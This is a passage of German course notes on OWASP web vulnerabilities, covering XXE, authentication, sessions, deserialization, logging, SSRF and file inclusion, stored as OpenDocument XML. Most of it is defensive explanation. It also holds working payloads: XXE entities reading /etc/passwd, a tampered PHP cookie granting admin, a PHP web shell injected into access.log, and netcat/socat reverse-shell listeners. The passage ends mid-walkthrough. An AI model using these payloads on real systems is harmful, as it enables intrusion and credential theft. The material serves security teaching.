              <text:p text:style-name="P524"><text:span text:style-name="T1">Directory Listing</text:span> aktiviert</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P523"><text:span text:style-name="T1">Auswirkung</text:span></text:p>
          <text:list text:style-name="L180">
            <text:list-item>
              <text:p text:style-name="P525">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26">Implementierung von <text:span text:style-name="T1">sicheren Installationsprozessen</text:span></text:p>
          <text:list text:style-name="L182">
            <text:list-item>
              <text:p text:style-name="P527">Wiederholbar, automatisierbar</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P527">Verwendung einer minimalen Plattform</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P527">Regelmäßige Updates</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P527">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28"><text:span text:style-name="T1">Ablauf</text:span></text:p>
          <text:list text:style-name="L184">
            <text:list-item>
              <text:p text:style-name="P529">XML-Dokument enthält Verweis (URI) auf eine externe Entität</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P529">XML-Dokument wird auf eine Web-Seite hochgeladen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P529">Web-Seite verarbeitet das XML-Dokument durch einen verwundbaren XML-Prozessor</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P529">Der XML-Prozessor löst den Verweis auf die externe Entität auf und wertet diese aus</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P529">Dadurch wird der Schadcode ausgeführt</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P528"><text:span text:style-name="T1">Auswirkungen</text:span></text:p>
          <text:list text:style-name="L185">
            <text:list-item>
              <text:p text:style-name="P530">Auslesen von Daten</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P530">Anfragen ausgehend vom übernommenen Server verschicken</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P530">Interne Systeme “scannen”</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P530">DoS</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P528"><text:span text:style-name="T1">Angriff</text:span></text:p>
          <text:list text:style-name="L186">
            <text:list-item>
              <text:p text:style-name="P531">Auslesen von Dateien aus dem Dateisystem des Servers:</text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="P532">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</text:p>
          <text:list text:style-name="L187">
            <text:list-item>
              <text:p text:style-name="P533">Durchführen von Anfragen auf Server, auf die ein Angreifer sonst nicht direkt zugreifen kann. Dadurch lassen sich auf Firewalls umgehen oder die Quelle von Angriffen wie Port-Scans verschleiern</text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="P534">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM "http://server.com/path" &gt;]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P528"><text:span text:style-name="T1">Ursachen</text:span></text:p>
          <text:list text:style-name="L188">
            <text:list-item>
              <text:p text:style-name="P535">Anwendunge akzeptiert direkt oder per Upload XML-Dokumente aus nicht vertrauenswürdigen Quellen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P535">Anwendung fügt nicht vertrauenswürdige Daten in XML-Dokumente ein</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P535">SOAP vor 1.2</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P528"><text:span text:style-name="T1">Gegenmaßnahmen</text:span></text:p>
          <text:list text:style-name="L189">
            <text:list-item>
              <text:p text:style-name="P536">Schwachstellen Scan durchführen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P536">Verwendung einfacher Datenformate e.g. JSON</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P536">Serialisieren sensibler Daten vermeiden</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P536">XML-Prozessoren Updaten</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P536">SOAP aktualisieren</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P536">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537"><text:span text:style-name="T1">Beispiele</text:span></text:p>
          <text:list text:style-name="L191">
            <text:list-item>
              <text:p text:style-name="P538">Version direkt oder indirekt verwendeter Komponenten sind nicht bekannt</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P538">Komponenten <text:span text:style-name="T1">nicht aktuell</text:span> oder werden <text:span text:style-name="T1">nicht mehr gewartet</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P538"><text:span text:style-name="T1">Kein regelmäßiger Schwachstellenscan</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P538"><text:span text:style-name="T1">Kompatibilität</text:span> von neuen Versionen wird <text:span text:style-name="T1">nicht getestet</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P537"><text:span text:style-name="T1">Auswirkungen</text:span></text:p>
          <text:list text:style-name="L192">
            <text:list-item>
              <text:p text:style-name="P539">Gering bis komplette <text:span text:style-name="T1">Übernahme des Systems</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P537"><text:span text:style-name="T1">Angriffsszenarien</text:span></text:p>
          <text:list text:style-name="L193">
            <text:list-item>
              <text:p text:style-name="P540">Komponenten laufen mit denselben Berechtigungen wie die Anwendung in denen sie verwendet werden. Verursacht durch e.g. Programmierfehler oder Backdoor</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P540">Ermitteln von IoT-Komponenten mit bekannten Schwachstellen e.g. Heartbleed über eine Suchmaschine</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P537"><text:span text:style-name="T1">Maßnahmen</text:span></text:p>
          <text:list text:style-name="L194">
            <text:list-item>
              <text:p text:style-name="P541"><text:span text:style-name="T1">Entfernen</text:span> von <text:span text:style-name="T1">nicht verwendeten Abhängigkeiten</text:span> und unnötiger Funktionalität</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P541">Regelmäßige <text:span text:style-name="T1">Inventarisierung</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P541"><text:span text:style-name="T1">OWASP Dependency Check</text:span> durch Maven-Plugin e.g. <text:span text:style-name="Source_Text">mvn verify</text:span> oder <text:span text:style-name="Source_Text">mvn org.owasp:dependency-check-maven:check</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P541"><text:span text:style-name="T1">Mitverfolgen</text:span> von sicherheitsrelevanten <text:span text:style-name="T1">Nachrichten</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P541">Komponenten nur aus <text:span text:style-name="T1">öffentlichen Quellen</text:span> und aus sicheren Verbindungen beziehen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P541"><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542"><text:span text:style-name="T1">Beispiele</text:span></text:p>
          <text:list text:style-name="L196">
            <text:list-item>
              <text:p text:style-name="P543">Anwendung erlaubt brute-force Angriffe</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P543">Anwendung verwendet <text:span text:style-name="T1">Standardpasswörter</text:span> oder schwache Passwörter</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P543"><text:span text:style-name="T1">Schwache Methode zum wiederherstellen des Zugangs</text:span> nach Passwortverlust</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P543"><text:span text:style-name="T1">Speichern</text:span> von Passwörtern <text:span text:style-name="T1">im Klartext</text:span> oder mit schwacher Hash-Funktion</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P543"><text:span text:style-name="T1">Keine Mehrfaktorauthentifizierung</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P543">Fehlerhafte Sitzungsverwaltung (Session-ID in URL, Reuse von Session-IDs)</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P542"><text:span text:style-name="T1">Angriffsszenarien</text:span></text:p>
          <text:list text:style-name="L197">
            <text:list-item>
              <text:p text:style-name="P544">Credential Stuffing (Brute Force mit dictionary)</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P544">Erraten schwacher Passwörter</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P542"><text:span text:style-name="T1">Maßnahmen</text:span></text:p>
          <text:list text:style-name="L198">
            <text:list-item>
              <text:p text:style-name="P545"><text:span text:style-name="T1">Mehrfaktorauthentifizierung</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P545">Anwendungen <text:span text:style-name="T1">nie</text:span> mit <text:span text:style-name="T1">Standardzugangsdaten</text:span> ausstatten</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P545"><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545">Aktuelle <text:span text:style-name="T1">Standards berücksichtigen</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P545">Härtung gegen Enumeration Attacks</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P545">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546"><text:span text:style-name="T1">Bedrohung</text:span></text:p>
          <text:list text:style-name="L200">
            <text:list-item>
              <text:p text:style-name="P547">Angreifer <text:span text:style-name="T1">übernimmt</text:span> die <text:span text:style-name="T1">Sitzung</text:span> eines authentifizierten Nutzers Ursachen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P547">Zu einfache oder nicht verschlüsselte Passwörter</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P547">Angreifer erhält Zugriff auf die Session ID - Keine Mehrfaktorauthentifizierung</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P546"><text:span text:style-name="T1">Beispiele</text:span></text:p>
          <text:list text:style-name="L201">
            <text:list-item>
              <text:p text:style-name="P548"><text:span text:style-name="Source_Text">jsessionid</text:span> in URL e.g. <text:span text:style-name="Source_Text">http://example.com/sale/saleitems;jsessionid=2P0OC2JDPXM0OQ SNDLPSKHCJUN2JV?dest=Hawaii</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P548">Gültigkeitsdauer einer Sitzung zu lange</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P548">Defizite beim Session-Management<text:line-break/></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P548">HTTP zustandslos</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P548">Session vom Benutzer über mehrere Anfragen hinweg zu identifizieren</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P548">Session-IDs als Authentisierungstokens</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P548">Durchgängige verwendung von SSL</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P548">Fehlende Cookie-Optionen (<text:span text:style-name="Source_Text">http-only</text:span>, <text:span text:style-name="Source_Text">secure</text:span>) oder fehlender <text:span text:style-name="Source_Text">session-timeout</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P548">Session-IDs nicht ausreichend zufällig</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P548">Schwache Passwörter</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P546"><text:span text:style-name="T1">Schutz der Session ID</text:span></text:p>
          <text:list text:style-name="L202">
            <text:list-item>
              <text:p text:style-name="P549">Session-ID nur per SSL übertragen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P549">Zugriff auf Session-ID durch Clientseitige Skripte unterbinden</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P549">Timeout für automatischen Logout setzen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P549">Cookie als “Tracking Mode” für die <text:span text:style-name="Source_Text">JSESSIONID</text:span> konfigurieren</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P549">Alle <text:span text:style-name="Source_Text">&lt;http-method&gt;</text:span>-Tags entfernen</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P546"><text:span text:style-name="T1">Beispiel durch Maßnahmen in </text:span><text:span text:style-name="Source_Text">web.xml</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P550">&lt;session-config&gt; </text:p>
      <text:p text:style-name="P551"><text:s text:c="4"/>&lt;cookie-config&gt; </text:p>
      <text:p text:style-name="P552"><text:s text:c="8"/>&lt;secure&gt;</text:p>
      <text:p text:style-name="P553"><text:s text:c="13"/>true </text:p>
      <text:p text:style-name="P554"><text:s text:c="8"/>&lt;/secure&gt; </text:p>
      <text:p text:style-name="P555"><text:s text:c="8"/>&lt;http-only&gt;</text:p>
      <text:p text:style-name="P556"><text:s text:c="13"/>true </text:p>
      <text:p text:style-name="P557"><text:s text:c="8"/>&lt;/http-only&gt; </text:p>
      <text:p text:style-name="P558"><text:s text:c="4"/>&lt;/cookie-config&gt; </text:p>
      <text:p text:style-name="P559"><text:s text:c="4"/>&lt;session-timeout&gt; </text:p>
      <text:p text:style-name="P560"><text:s text:c="8"/>15 </text:p>
      <text:p text:style-name="P561"><text:s text:c="4"/>&lt;/session-timeout&gt; </text:p>
      <text:p text:style-name="P562"><text:s text:c="4"/>&lt;tracking-mode&gt; </text:p>
      <text:p text:style-name="P563"><text:s text:c="8"/>COOKIE </text:p>
      <text:p text:style-name="P564"><text:s text:c="4"/>&lt;/tracking-mode&gt; </text:p>
      <text:p text:style-name="P565">&lt;/session-config&gt;</text:p>
      <text:list text:style-name="L203">
        <text:list-item>
          <text:p text:style-name="P566"><text:span text:style-name="T1">Gegenmaßnahmen</text:span></text:p>
          <text:list text:style-name="L204">
            <text:list-item>
              <text:p text:style-name="P567">Brute Force durch ausprobieren von Passwörtern durch CAPTCHAs verhindern</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P567">Schlechte Logout-Funktionalität absichern, indem Session-Informationen vollständig gelöscht werden</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P567">Keine Passwörter im Klartext speichern, sondern auf Hash-Funktionen mit Salt verlassen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P567">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568"><text:span text:style-name="T1">Beispiele</text:span></text:p>
          <text:list text:style-name="L206">
            <text:list-item>
              <text:p text:style-name="P569">Anwendungen verwenden Bibliotheken aus nicht vertrauenswürdigen Quellen oder CDNs</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P569">Durch unsichere CI/CD-Pipeline besteht Möglichkeit zum unberechtigten Zugriff</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P569">Automatische Updates ohne Integritätsprüfung</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P568"><text:span text:style-name="T1">Angriffsszenarien</text:span></text:p>
          <text:list text:style-name="L207">
            <text:list-item>
              <text:p text:style-name="P570">Update ohne Signatur</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P570">Router oder andere Geräte prüfen oft nicht auf Signaturen und sind leichte Angriffsziele</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P570">Solarwinds: Updates mit Schadcode</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P570">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571">Verwenden digitaler <text:span text:style-name="T1">Signaturen</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P571">Sicherstellen, dass Dependencies aus <text:span text:style-name="T1">vertauenswürdigen Repositories</text:span> stammen</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P571">Sicherstellen, dass Werkzeuge zur Überprüfung der Supply-Chain eingesetzt werden e.g. <text:span text:style-name="T1">OWASP Dependency Check</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P571"><text:span text:style-name="T1">Review Process</text:span> fÜr Code- und Konfigurationsänderungen</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P571"><text:span text:style-name="T1">Saubere</text:span> Trennung, Konfiguration und Zugangssteuerung in der <text:span text:style-name="T1">CI/CD Pipeline</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P571"><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572">Die <text:span text:style-name="T1">serialisierten Daten</text:span> können <text:span text:style-name="T1">manipuliert</text:span> sein, um gezielt Werte zu verändern oder Code auf dem Zielsystem auszuführen</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P572"><text:span text:style-name="T1">Anfällig</text:span> sind e.g. </text:p>
          <text:list text:style-name="L210">
            <text:list-item>
              <text:p text:style-name="P573">Fern- und Interprozesskommunikation: RPC und IPC</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P573"><text:span text:style-name="T1">Web Services</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P573">Message Broker</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P573">Caching- / Persistenz-Komponenten</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P573">HTTP <text:span text:style-name="T1">Cookies</text:span>, HTML Formulare, <text:span text:style-name="T1">Tokens</text:span> zur Authentifizierung über APIs</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P572"><text:span text:style-name="T1">Auswirkungen</text:span></text:p>
          <text:list text:style-name="L211">
            <text:list-item>
              <text:p text:style-name="P574">Komplette <text:span text:style-name="T1">Übernahme</text:span> des Zielsystems und eventuelle Ausbreitung</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P572"><text:span text:style-name="T1">Angriffsszenarien</text:span></text:p>
          <text:list text:style-name="L212">
            <text:list-item>
              <text:p text:style-name="P575">Eine PHP-Anwendung verwendet Objektserialisierung, um “Super-Cookie” zu speichern <text:span text:style-name="Source_Text">a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P575">Angreifer modifiziert das serialisierte Objekt, um sich selbst administrative Rechte zu geben <text:span text:style-name="Source_Text">a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P575">Eine React-Anwendunge ruft verschiedene Spring-Boot Microservices auf</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P575">Durch Verwendung des funktionales Programmierparadigmas soll der Code der Anwendung unveränderbar sein (immutable)</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P575">Zur Realisierung wird der Anwendungszustand mit jeder Anfrage zwischen Client und Server serialisiert hin- und hergeschickt Angriff</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P575">Einem Angreifer fällt die Java-Object-Signatur “R00” auf</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P575">Der Angreifer verndet dann die “Java Serial Killer”-Erweiterung für Burp-Suite, um eigenen Code auf dem Server auszuführen</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P572"><text:span text:style-name="T1">Gegenmaßnahmen</text:span></text:p>
          <text:list text:style-name="L213">
            <text:list-item>
              <text:p text:style-name="P576"><text:span text:style-name="T1">Keine serialisierten Objekte aus nicht vertrauenswürdigen Quellen</text:span> akzeptieren</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P576">Nur Serialisierungsmedien verwenden, die ausschließlich <text:span text:style-name="T1">primitive Datentypen</text:span> erlauben</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P576"><text:span text:style-name="T1">Signaturen</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P576"><text:span text:style-name="T1">Typenprüfung</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P576">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577"><text:span text:style-name="T1">Beispiele</text:span></text:p>
          <text:list text:style-name="L215">
            <text:list-item>
              <text:p text:style-name="P578"><text:span text:style-name="T1">Nicht protokollierte</text:span> erfolgreiche und fehlgeschlagene <text:span text:style-name="T1">Login-Versuche</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P578">Nicht protokollierte Systemaktionen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P578"><text:span text:style-name="T1">Fehler</text:span>, Ausnahmen und Warnungen werden nicht oder <text:span text:style-name="T1">nicht ausreichend protokolliert</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P578">Log-Dateien werden nicht automatisiert auf verdächtiges Verhalten überwacht</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P578">Logs werden nur lokal gespeichert</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P578"><text:span text:style-name="T1">Uhrzeiten sind nicht synchronisiert</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P578">Es sind <text:span text:style-name="T1">keine</text:span> angemessenen <text:span text:style-name="T1">Schwellwerte</text:span> für das Auslösen von <text:span text:style-name="T1">Alarmen</text:span> festgelegt</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P578">Es werden keine Alarme ausgelöst, wenn ein Pentest durchgeführt wird</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P578"><text:span text:style-name="T1">Angriffe werden nicht in Echtzeit erkannt</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P577"><text:span text:style-name="T1">Angriffsszenarien</text:span></text:p>
          <text:list text:style-name="L216">
            <text:list-item>
              <text:p text:style-name="P579">Angreifer scannen eine Anwendung auf typische Passwörter und sehen nur fehlgeschlagene Logins</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P579"><text:span text:style-name="T1">Brute Force</text:span> möglich</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P579">Firma verwendet Sandbox zur Analyse von E-mail anhängen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P579">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580">Sicherstellen, dass alle Vorgänge mit relevanten Kontextinformationen protokolliert werden (Logins, Fehlerhafte Logins, Eingabevalidierungsfehler, Fehler, IP, Session, Benutzer, Zeitstempel)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P580">Lange genug speichern, um forensische Analyse durchführen zu können</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P580">Verwendung von Monitoring (SIEM, XDR, Elasticsearch, Kibana)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P580">Verwendung eines standatisierten Log-Formats, damit diese einfach ausgewertet werden können</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P580">Log-Dateien append-only</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P580">Incident Response and Recovery Plan etablieren</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P580">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581"><text:span text:style-name="T1">Beispiel</text:span></text:p>
          <text:list text:style-name="L219">
            <text:list-item>
              <text:p text:style-name="P582">Angreifer stellt einen Request zusammen und <text:span text:style-name="T1">zwingt die Anwendung diese Request an ein Ziel zuschicken</text:span>, welches so von der Anwendung nicht vorgesehen war</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P581"><text:span text:style-name="T1">Probleme</text:span></text:p>
          <text:list text:style-name="L220">
            <text:list-item>
              <text:p text:style-name="P583">Funktioniert auch, wenn Schutzmechanismen vorhanden sind, wie e.g. </text:p>
              <text:list text:style-name="L221">
                <text:list-item>
                  <text:p text:style-name="P584">Web Application Firewall</text:p>
                </text:list-item>
                <text:list-item>
                  <text:p text:style-name="P584">VPN</text:p>
                </text:list-item>
                <text:list-item>
                  <text:p text:style-name="P584">Network Access Control List (ACL)</text:p>
                </text:list-item>
                <text:list-item>
                  <text:p text:style-name="P584">Das Laden von Inhalten über URLs ist gerade in modernen Web-Anwendungen ein grundlegender Mechanismus, siehe AJAX oder fetch-API</text:p>
                </text:list-item>
              </text:list>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P581"><text:span text:style-name="T1">Angriffsszenarien</text:span></text:p>
          <text:list text:style-name="L222">
            <text:list-item>
              <text:p text:style-name="P585"><text:span text:style-name="T1">Scan der Ports</text:span> interner Server</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P585">Wenn das Netzwerk nicht segmentiert ist, können Angreifer die <text:span text:style-name="T1">internen Systeme ermitteln</text:span> und auch herausfinden, ob Ports auf internen Servern offen oder geschlossen sind</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P585">Port-Scan funktioniert dadurch, dass die Ergebnisse von Verbindungen zu internen Servern mittels SSRF ausgewertet werden</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P585">Abhängig vom Ergebnis oder der Responsetime ergibt sich dann, ob Port offen oder geschlossen ist</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P585"><text:span text:style-name="T1">Preisgabe von sensiblen Daten</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P585">Angreifer können auf lokale Dateien oder interne Dienste zugreifen, um sensible Informationen zu gewinnen.</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P585">Zugriff auf Metadatenspeicher von Cloud-Diensten</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P585">Viele Cloud-Anbieter haben einen Metadatenspeicher</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P585">Angreifer können mittels SSRF die Metadaten auslesen und so sensible Informationen gewinnen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P585">Kompromittiere interner Dienste</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P585">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586"><text:span text:style-name="T1">Mehrstufige Verteidigung</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P586">Maßnahmen auf Netzwerkebene</text:p>
          <text:list text:style-name="L224">
            <text:list-item>
              <text:p text:style-name="P587"><text:span text:style-name="T1">Netzwerksegmentierung</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P587"><text:span text:style-name="T1">Deny by default</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P586">Maßnahmen auf Anwendungsebene</text:p>
          <text:list text:style-name="L225">
            <text:list-item>
              <text:p text:style-name="P588">Bereinigen und <text:span text:style-name="T1">Validieren sämtlicher Eingabedaten</text:span>, die vom Client kommen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P588"><text:span text:style-name="T1">Positivlisten</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P588">Keine Antworten im Reinformat senden</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P588">HTTP-Umleitung ausschalten</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P586">Zusätzliche Maßnahmen</text:p>
          <text:list text:style-name="L226">
            <text:list-item>
              <text:p text:style-name="P589"><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590"><text:span text:style-name="T1">Anfälliger Code</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P591">&lt;?php</text:p>
      <text:p text:style-name="P592"><text:s text:c="4"/>$file = $_GET['page']; //The page we wish to display</text:p>
      <text:p text:style-name="P593"><text:s text:c="4"/>$ext = substr($file, strrpos($file, '.') + 1); // get file extension</text:p>
      <text:p text:style-name="P594"><text:s text:c="4"/>if($ext != "php") { // allow only php files for inclusion</text:p>
      <text:p text:style-name="P595"><text:s text:c="4"/>unset($file);</text:p>
      <text:p text:style-name="P596"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P597"><text:s text:c="4"/>include($file);</text:p>
      <text:p text:style-name="P598">?&gt;</text:p>
      <text:list text:style-name="L228">
        <text:list-item>
          <text:p text:style-name="P599"><text:span text:style-name="T1">Angriff</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P600">nc 172.17.0.1 80 # Connect via netcat</text:p>
      <text:p text:style-name="P601">&lt;?php echo shell_exec($_GET['cmd']); ?&gt; # Insert php into access.log</text:p>
      <text:p text:style-name="First_20_paragraph">Dann lokal einen Listener starten:</text:p>
      <text:p text:style-name="Text_20_body">Netcat:</text:p>
      <text:p text:style-name="P602">nc -lnvp 4242 # Listener starten</text:p>
      <text:p text:style-name="First_20_paragraph">Socat:</text:p>
      <text:p text:style-name="P603">socat -dd TCP-LISTEN:4444 STDOUT</text:p>
      <text:p text:style-name="First_20_paragraph">Im Browser, folgende URL verwenden:</text:p>
      <text:p text:style-name="Text_20_body">Netcat:</text:p>
